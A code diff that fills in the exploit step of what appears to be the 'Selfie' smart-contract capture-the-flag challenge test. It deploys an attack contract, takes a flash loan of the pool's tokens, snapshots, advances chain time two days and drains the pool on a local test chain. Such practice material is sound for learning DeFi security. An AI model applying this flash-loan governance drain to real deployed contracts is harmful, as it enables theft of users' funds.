@@ -27,10 +27,31 @@ describe('[Challenge] Selfie', function () {
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.equal(TOKENS_IN_POOL);
+
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.be.equal(0);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const contractFactory = await ethers.getContractFactory("HackSelfiePool", deployer);
+        // address _tokenAddr, address _governance, address _selfiePool, address _attacker)
+        const contract = await contractFactory.deploy(
+            this.token.address,
+            this.governance.address,
+            this.pool.address,
+            attacker.address
+        );
+
+        await contract.deployed();
+
+        await this.token.snapshot();
+        await contract.flashLoan(TOKENS_IN_POOL);
+
+        await ethers.provider.send("evm_increaseTime", [60 * 60 * 24 * 2]);
+
+        await contract.drainAllFunds({ value: 0 });
     });
 
     after(async function () {
